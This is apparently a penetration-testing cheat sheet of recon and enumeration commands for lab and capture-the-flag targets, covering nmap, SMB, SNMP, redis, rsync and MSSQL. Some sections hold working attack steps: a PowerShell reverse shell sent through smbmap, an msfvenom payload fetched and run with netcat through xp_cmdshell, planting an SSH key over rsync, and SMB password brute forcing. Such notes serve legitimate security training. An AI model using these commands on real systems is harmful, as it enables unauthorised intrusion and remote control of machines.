# Recon and Enumeration
### Table of Contents
- [Recon and Enumeration](#recon-and-enumeration)
    + [Table of Contents](#table-of-contents)
  * [AutoRecon](#autorecon)
  * [General Enumeration Figure out the Hosts and Services Running](#general-enumeration-figure-out-the-hosts-and-services-running)
    + [NetDiscover](#netdiscover)
    + [Nmap](#nmap)
      - [Ping Scan -sn Option](#ping-scan--sn-option)
      - [TCP Connect Scan](#tcp-connect-scan)
      - [TCP SYN Scan](#tcp-syn-scan)
      - [UDP Port Scanning](#udp-port-scanning)
      - [Fingerprint Services](#fingerprint-services)
      - [Scanning port ranges with Nmap](#scanning-port-ranges-with-nmap)
    + [NSE](#nse)
  * [Vulnerability Scanning](#vulnerability-scanning)
  * [SMTP Port 25 default](#smtp-port-25-default)
    + [SMTP User Enum](#smtp-user-enum)
  * [POP3 Port 110 default](#pop3-port-110-default)
  * [SNMP Ports 161, 162 default](#snmp-ports-161--162-default)
    + [Onesixtyone](#onesixtyone)
    + [SNMPwalk](#snmpwalk)
  * [NFS](#nfs)
  * [SMB Enumeration](#smb-enumeration)
    + [SMB Checklist](#smb-checklist)
    + [smbmap](#smbmap)
    + [smbclient](#smbclient)
    + [rpcclient](#rpcclient)
    + [Enum4linux](#enum4linux)
    + [Nmap SMB scripts](#nmap-smb-scripts)
  * [Search services vulnerabilities](#search-services-vulnerabilities)
  * [redis port 6379](#redis-port-6379)
  * [Rsync port 873](#rsync-port-873)
  * [Stuck](#stuck)

## AutoRecon
- Always start here, trust me.
```
autorecon -ct 2 -cs 2 -vv -o outputdir 192.168.1.100 192.168.1.1/30 localhost
autorecon 10.200.97.200
autorecon -t targets.txt — only-scans-dir
````
- `-ct` (concurrent targets)
- `-o` custom output directory location.
- `-cs` limits the number of concurent scans per target
- Auto recon will create and store the results in the `/results` directory.
## General Enumeration Figure out the Hosts and Services Running
### NetDiscover
- Netdiscover is an active/passive reconnaissance tool that uses ARP to find live hosts on a local network.
- Netdiscover actively searches for live hosts on the network by broadcasting ARP requests like a router.
- By default netdiscover operates in active mode, however you can use it in passive mode with `-p`.  With passive move it will not broadcast anything.
- Note: ARP is unable to cross network boundaries or over any VPN connection
``` 
netdiscover -r 10.11.1.0/24
````
### Nmap
- I have no time to read, just give me the nmap scanning meta.
````
nmap -sS x.x.x.x -p- --min-rate 10000
nmap -A -T5 x.x.x.x -p- -vv
nmap --script=scriptname.nse x.x.x.x -vv
````
#### Ping Scan -sn Option
- -sn tells nmap to perform host discovery only without any additional port scanning and prints out details of any hosts that responded.
````
nmap -sn 10.11.1.0/24
````
- nmap also has the -Pn option which will disable the host discovery stage altogether on a scan.  The -Pn option is best used in combination with other scans.
#### TCP Connect Scan
- The TCP connect scan in Nmap is the alternative TCP scan to use when a SYN scan is not an option.  
- TCP connect scan should be used when nmap does not have raw packet privileges which is required for a SYN scan.
````
nmap -sT [target host]
````
#### TCP SYN Scan
- Does not complete the 3 way handshake
````
nmap -sS [target host]
````
#### UDP Port Scanning
- Always check for UDP ports will pick up DNS, NTP, SNMP 
````
nmap -sU [target host]
nmap -sU -F [target host]
````
#### Fingerprint Services
- To figure out what services are running on target ports we use:
````
nmap -sV [target ip address]
````
- The following command will use nmap port scan to detect the service and OS:
````
nmap -sV -O [target ip address]
````
- Can also use the -A option in Nmap.  The A stands for aggressive scan options and enables OS detection, script scanning and traceroute.
````
nmap -A [target ip address]
````
#### Scanning port ranges with Nmap
- By default nmap will only scan the most 1000 common ports. To override the default use the -p
````
nmap -p 1-100 [target host]
nmap -p 137-139,445 [target host]
````
### NSE
- Web Application Vulnerability scan:
````
nmap --script=http-vuln* 10.10.10.10
````
- Location of scripts 
````
/usr/share/nmap/scripts
````
- Scripts are sorted by protocol, can sort by service
````
ls -l /usr/share/nmap/scripts/ftp*
````
- Nmap script help 
````
nmap --script-help ftp-anon
````
- Nmap script execution
````
nmap --script=[script name] [target host]
````
- The following command executes a script names http-robots.txt on port 80:
````
nmap --script=http-robots.txt.nse [target host]
````
## Vulnerability Scanning
- Good nmap command
````
nmap -T4 -n -sC -sV -p- -oN nmap-versions --script='*vuln*' [ip]
````
````
nmap -p 80 --script=all $ip - Scan a target using all NSE scripts. May take an hour to complete.
nmap -p 80 --script=*vuln* $ip - Scan a target using all NSE vuln scripts.
nmap -p 80 --script=http*vuln* $ip  - Scan a target using all HTTP vulns NSE scripts.
nmap -p 21 --script=ftp-anon $ip/24 - Scan entire network for FTP servers that allow anonymous access.
nmap -p 80 --script=http-vuln-cve2010-2861 $ip/24 - Scan entire network for a directory traversal vulnerability. It can even retrieve admin's password hash.
````
## SMTP Port 25 default
### SMTP User Enum
````
smtp-user-enum -M VRFY -U /usr/share/wordlists/dirb/common.txt -t [target ip]
````
- `-M` -> Sets the mode, the options are: EXPN, VRFY, RCPT (default VRFY)
- `-u` -> Check if a remote exists on a system
- `-U` -> File of usernames to check via smtp service
- `-t` -> Server host running the smtp service
- Examples:
````
smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1
smtp-user-enum -M EXPN -u admin1 -t 10.0.0.1
smtp-user-enum -M RCPT -U users.txt -T mail-server-ips.txt
smtp-user-enum -M EXPN -D example.com -U users.txt -t 10.0.0.1
````
## Telnet Banner Grab
````
telnet 10.10.182.147 80
GET / HTTP/1.0
host: telnet
````
````
GET / HTTP/1.1
host: telnet
````
![telnet banner grab](https://user-images.githubusercontent.com/75596877/138183428-3c6b4c51-f1c4-4c48-9038-f252f6110a70.png)
## NetCat Banner Grab
````
nc 10.10.182.147
GET / HTTP/1.1
host: netcat
````
````
GET / HTTP/1.0
host: netcat
````
### NetCat FTP Banner Grab
![nc ftp](https://user-images.githubusercontent.com/75596877/138183900-60957ad6-0460-44d9-b64a-14cbd2f6e4a1.png)

## POP3 Port 110 default
- Connect to the targets pop3 port
````
telnet 10.10.10.10 110
````
- ![alt text](https://i2.wp.com/2.bp.blogspot.com/-4rztPGl7PRs/W_L6dz7yPTI/AAAAAAAAbQ8/oQGQ3S6S3CMLVcKt3clCF7QMSFRC16tIgCEwYBhgL/s1600/8.png?w=640&ssl=1)
- Command to retrieve emails:
````
RETR 1
RETR 2
````
## SNMP Ports 161, 162 default
- Commands 
- Read, write, trap, traversal command
- SNMP community strings
- Community strings are like a username or password that allows access to the managed device. 
- There are three different community strings that allow a user to set 1 ready only commands, 2 read write commands and 3 traps.  
- SNMPv3 community string is replaced with a user and password authentication.  
- SNMPv1/v2 is factory default read only strings set to public and read write string set to private.
### Onesixtyone
- Onesixtyone is a fast tool to brute force SNMP community strings and take advantage of the connectionless protocol.
- Onesixtyone requires two arguments: a file that contains the list of community strings to try and the target host ip address.  
- You can also provide a list of host IP addresses to be scanned by onesixtyone using the -i option.
````
onesixtyone #access help menu
onesixtyone -c snmp_community_strings_wordlist_onesixtyone.txt -p 161 192.168.43.161
````
- Location of wordlists
````
/usr/share/wordlists/seclists/Discovery/SNMP
````
### SNMPwalk
- Snmpwalk queries MIB values to retrieve information about the managed devices, but as a minimum requires a valid SNMP read only community string.
- Run snmpwalk with the default community string ‘public’ on and SNMPv1 device use the following command:
````
snmpwalk -c public -v1 [target host]
````
- You can also request a single object ID value using the following command:
````
snmpwalk -c public -v1 [target host] [OID]
````
- Nmap SNMP scripts
````
ls -l /usr/share/nmap/scripts/snmp*
````
## NFS
- If there is a nfs port open on the attack machine try to find the name of the share
````
showmount -e [target ip]
````
- This should return a path like seen below
````
/srv/hermes*
````
- Make a directory on your box to mount to the target share
````
mkdir hack
````
- Mount to the target
````
sudo mount -t nfs [target ip]:/srv/hermes ~/hack
````
## SMB Enumeration
- The SMB is a network file sharing protocol that provides access to shared files and printers on a local network.
- When clients and servers use different operating systems and SMB versions, the highest supported version will be used for communication.
- SMB uses the following TCP and UDP ports:
````
Netbios-ns 137/tcp #NETBIOS Name Service
Netbios-ns 137/udp
netbios-dgm 138/tcp #NETBIOS Datagram Service
Netbios-dgm 138/udp
Netbios-ssn 139/tcp #NETBIOS session service
Netbios-ssn 139/udp
Microsoft-ds 445/tcp #if you are using active directory
````
### SMB Checklist
- Basic Commands
- From SMB command line
- View/Get Files
````
get services.txt
more services.txt
````
- Enumerate Hostname 
````
nmblookup -A $ip
````
- List Shares
````
smbmap -H $ip
smbclient -L 10.129.101.197 -U Administrator
nmap --script smb-enum-shares -p 139,445 $ip
````
- Connect to a listed share
````
smbclient \\\\10.129.101.197\\C$ -U Administrator
smbclient \\\\$ip\\[share name]
````
- Check Null Sessions
````
smbmap -u anonymous -H 10.10.115.116
smbmap -H $ip
rpcclient -U "" -N $ip
````
- With authentication 
````
smbmap -u svc-admin -p management2005 -H 10.10.248.93
````
- Check for Vulnerabilities  
````
nmap --script smb-vuln* -p 139,445 $ip
````
- Overall Scan  
````
enum4linux -a $ip
````
- Get a shell with smbmap (windows)
````
smbmap -u jsmith -p 'R33nisP!nckle' -d ABC -h 192.168.2.50 -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.153""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"' 
````
- Brute Force SMB
````
medusa -h $ip -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt $ip  -vvvv
````
### smbmap
- smbmap is one of the best ways to enumerate samba. smbmap allows pen-testers to run commands(given proper permissions), download and upload files, and overall is just incredibly useful for smb enumeration.
````
smbmap -u "admin" -p "password" -H 10.10.10.10 -x "ipconfig"
````
- `-s` -> specify the share to enumerate
- `-d` -> specify the domain to enumerate
- `--download` -> downloads a file
- `--upload` -> uploads a file
### smbclient
- List shares
````
smbclient -L 10.10.115.116
````
- smbclient allows you to do most of the things you can do with smbmap, and it also offers you and interactive prompt.
- `-w` -> specify the domain(workgroup) to use when connecting to the host
- `-I` -> specify the ip address of the host
- `-c "ipconfig"` -> would run the `ipconfig` command on the host
- `-U` -> specify the username to authenticate with 
- `-P` -> specifies the password to authenticate with
- `-N` -> tells smbclient to not use a password
- `get test` -> would download the file named `test`
- `put /etc/hosts` -> would put your `/etc/hosts` file on the target 
- Syntax: 
- To see which shares are available on a given host, run:
````
 /usr/bin/smbclient -L 10.10.10.10
````
- For example, if you are trying to reach a directory that has been shared as 'public' on a machine called 10.10.10.10, the service would be called \\10.10.10.10\public. - 
- However, due to shell restrictions, you will need to escape the backslashes, so you end up with something like this:
````
/usr/bin/smbclient \\\\10.10.10.10\\public mypasswd
````
- To authenticate with a null sessions
````
smbmap -u 'root' -p '' -H 10.10.232.5 -x 'ip addr'
````
### rpcclient
- A tool used for executing client-side MS-RPC functions. A null session in a connection with a samba or SMB server that does not require authentication with a password.
````
rpcclient -U “” [target ip address]
````
- The -U option defines a null username, you will be asked for a password but leave it blank (hit enter!!!!)
- The command line will change to the rpcclient context
````
rpcclient $>
````
- To retrieve some general information about the server like the domain and number of users:
````
querydominfo
````
- This command returns the domain, server, total users on the system and some other useful information.  
- Also shows the total number of user accounts and groups available on the target system.
- To retrieve a list of users present on the system 
````
enumdomusers
````
- The result is a list of user accounts available on the system with the RID in hex.  We can now use rpcclient to query the user info for more information:
````
lookupsids #convert SIDs to names
lookupsids S-1-5-21-3981879597-1135670737-2718083060-1002
lookupnames #convert names to SIDs
lookupnames Bill
````
````
enumprivs
found 35 privileges

SeCreateTokenPrivilege          0:2 (0x0:0x2)
SeAssignPrimaryTokenPrivilege           0:3 (0x0:0x3)
SeLockMemoryPrivilege           0:4 (0x0:0x4)
SeIncreaseQuotaPrivilege                0:5 (0x0:0x5)
SeMachineAccountPrivilege               0:6 (0x0:0x6)
SeTcbPrivilege          0:7 (0x0:0x7)
SeSecurityPrivilege             0:8 (0x0:0x8)
SeTakeOwnershipPrivilege                0:9 (0x0:0x9)
SeLoadDriverPrivilege           0:10 (0x0:0xa)
SeSystemProfilePrivilege                0:11 (0x0:0xb)
SeSystemtimePrivilege           0:12 (0x0:0xc)
SeProfileSingleProcessPrivilege                 0:13 (0x0:0xd)
SeIncreaseBasePriorityPrivilege                 0:14 (0x0:0xe)
SeCreatePagefilePrivilege               0:15 (0x0:0xf)
SeCreatePermanentPrivilege              0:16 (0x0:0x10)
SeBackupPrivilege               0:17 (0x0:0x11)
SeRestorePrivilege              0:18 (0x0:0x12)
SeShutdownPrivilege             0:19 (0x0:0x13)
SeDebugPrivilege                0:20 (0x0:0x14)
SeAuditPrivilege                0:21 (0x0:0x15)
SeSystemEnvironmentPrivilege            0:22 (0x0:0x16)
SeChangeNotifyPrivilege                 0:23 (0x0:0x17)
SeRemoteShutdownPrivilege               0:24 (0x0:0x18)
SeUndockPrivilege               0:25 (0x0:0x19)
SeSyncAgentPrivilege            0:26 (0x0:0x1a)
SeEnableDelegationPrivilege             0:27 (0x0:0x1b)
SeManageVolumePrivilege                 0:28 (0x0:0x1c)
SeImpersonatePrivilege          0:29 (0x0:0x1d)
SeCreateGlobalPrivilege                 0:30 (0x0:0x1e)
SeTrustedCredManAccessPrivilege                 0:31 (0x0:0x1f)
SeRelabelPrivilege              0:32 (0x0:0x20)
SeIncreaseWorkingSetPrivilege           0:33 (0x0:0x21)
SeTimeZonePrivilege             0:34 (0x0:0x22)
SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23)
SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)
````
- Enumerate Privleges on the target box
````
getusername
Account Name: Guest, Authority Name: RELEVANT
````
- Get username you are running as 
- 
````
queryuser [username]
username=pbx
queryuser pbx, queryuser 1000, queryuser 0x3e8
````
-This command will return information about the profile path on the server, the home drive, password related settings and a lot more.
- To see an overview of all enumeration objects just type enum+tabx2.
- If you get an error that says:
````
Cannot connect to server.  Error was NT_STATUS_CONNECTION_DISCONNECTED
````
- Occurs because the minimum protocol version for smbclient has been set to SMB2_02
- Fix with:
````
sudo vim /etc/samba/smb.conf
````
- Add the following line to the config under the `[global]` section
````
client min protocol = CORE
````
- Alternative method to enumdomusers is through RID cycling.
- To determine the full SID we can run the: ‘lookupnames’ command and search for the domain with the following command:
````
lookupnames pbx
````
- There are two sets of RIDS 500-1000 for system and 1000-10000 for Domain created users and groups. 
- If we append -500 to the SID and look it up using the lookupsids command we get the following output with the username:
````
rpcclient $> lookupsids S-1-5-21-532510730-1394270290-3802288464-500
S-1-5-21-532510730-1394270290-3802288464-500 *unknown*\*unknown* (8)
````
- Shows SID is unknown, increase by one
````
rpcclient $> lookupsids S-1-5-21-532510730-1394270290-3802288464-501
S-1-5-21-532510730-1394270290-3802288464-501 PBX\nobody (1)
````
- Find a valid user, increase the RID to 1000.
````
rpcclient $> lookupsids S-1-5-21-532510730-1394270290-3802288464-1000
S-1-5-21-532510730-1394270290-3802288464-1000 PBX\pbx (1)
````
- Have the full SID now
### Enum4linux
- Enum4linux is a linux alternative to enum.exe and it is used to enumerate data from windows or samba hosts.
```
enum4linux [target ip]
````
-Will auto RID cycle 
- Part of autorecon!
- Recommend to > output to a text file for reference (its alot)
### Nmap SMB scripts
````
ls -l /usr/share/nmap/scripts/smb*
nmap --script=[scriptname] [target ip]
````
- For smb-os-discovery:
````
nmap -p 139,445 --script=smb-os-discovery [target ip]
````
- First scans the target for all known SMB vulnerabilities 
- Second to see if target is vulnerable to EternalBlue

````
nmap -p 139,445 --script=smb-vuln* [target ip]
nmap -p 445 [target] --script=smb-vuln-ms17-010
````
## Search services vulnerabilities
````
searchsploit --exclude=dos -t apache 2.2.3
msfconsole; > search apache 2.2.3
````
## redis port 6379
- https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
- Enumeration
````
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
````
- Manual Enumeration
- Redis is a text based protocol, you can just send the command in a socket and the returned values will be readable. Also remember that Redis can run using ssl/tls (but this is very weird).
- In a regular Redis instance you can just connect using nc or you could also use redis-cli
````
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
````
- Run the `info` first, it will either dump the `redis` instance or say `-NOAUTH Authentication required.`
- Username / Password are stored in the `redis.conf` file by default
````
grep ^[^#] redis.conf
config set requirepass p@ss$12E45.
masteruser
````
- Get Connected 
````
nc 10.10.63.208 6379
info
<server reply>
redis-cli -h 10.10.63.208
10.10.63.208:6379> info
NOAUTH Authentication required.
10.10.63.208:6379> AUTH B65Hx562.....
OK
````
- Authenticated Enumeration
````
Authenticated enumeration
If the Redis instance is accepting anonymous connections or you found some valid credentials, you can start enumerating the service with the following commands:
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
````
- Dumping Database
- Inside Redis the databases are numbers starting from `0`. You can find if anyone is used in the output of the command info inside the "Keyspace" chunk:
- ![alt text](https://gblobscdn.gitbook.com/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-MCwrx6EQpaXH4dsxZl3%2F-MCxgtV3m0F2z4KAOOsB%2Fimage.png?)
````
if value is of type string -> GET <key>
if value is of type hash -> HGETALL <key>
if value is of type lists -> lrange <key> <start> <end>
if value is of type sets -> smembers <key>
if value is of type sorted sets -> ZRANGEBYSCORE <key> <min> <max>
````
- Use the TYPE command to check the type of value a key is mapping to:
````
type <key>
````
- redis RCE
- https://github.com/Ridter/redis-rce
## Rsync port 873
- Basic information
- rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers by comparing the modification timesand sizes of files.
````
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy        	
NAS_Public     	
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
````
- Enumerate shared folders
- An rsync module is essentially a directory share. These modules can optionally be protected by a password. 
- This options lists the available modules and, optionally, determines if the module requires a password to access:
````
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

#Example using IPv6 and a different port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
````
- Manual Rsync
- List a shared folder
````
rsync -av --list-only rsync:/10.10.232.5/shared_name
````
- Copy all files to your local machine via the following command:
````
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
````
- If you have credentials you can list/download a shared name using (the password will be prompted):
````
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
````
- You could also upload some content using rsync (for example, in this case we can upload an authorized_keys file to obtain access to the box):
````
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
#full command syntax below
rsync -av id_rsa.pub rsync://rsync-connect@10.10.63.208/files/sys-internal/.ssh/authorized_keys
````
- Find the rsyncd configuration file:
````
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
````
- Inside the config file sometimes you could find the parameter `secrets file = /path/to/file` and this file could contains usernames and passwords allowed to authenticate to rsyncd.
## ms-sql-s port 1433
- Use `impacket mssqlclient.py` to connect
````
python mssqlclient.py ARCHETYPE/sql_svc@10.129.62.77 -windows-auth
````
- https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
- Check what is the role we have in the server
````
SELECT is_srvrolemember('sysadmin');
````
- If the output is 1 , it translates to True .
- Check to see if `xp_cmdshell` is enabled
````
SQL> EXEC xp_cmdshell 'net user';
````
- Set up the command execution through the `xp_cmdshell`:
````
EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell
````
- First as it’s disabled by default:
````
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
````
- Now we are able to execute system commands:
````
xp_cmdshell "whoami"
````
- Better Command Execution
````
xp_cmdshell "powershell -c pwd"
````
- Get a shell on target with `nc` or `msfvenom`
````
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.154 LPORT=80 -f exe -o shell.exe
python3 -m http.server
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe; ./nc64.exe"
````
- Find the admin password from the shell
````
python /usr/local/bin/psexec.py administrator@10.129.62.77
````

## Stuck
- https://book.hacktricks.xyz/
- https://guide.offsecnewbie.com/
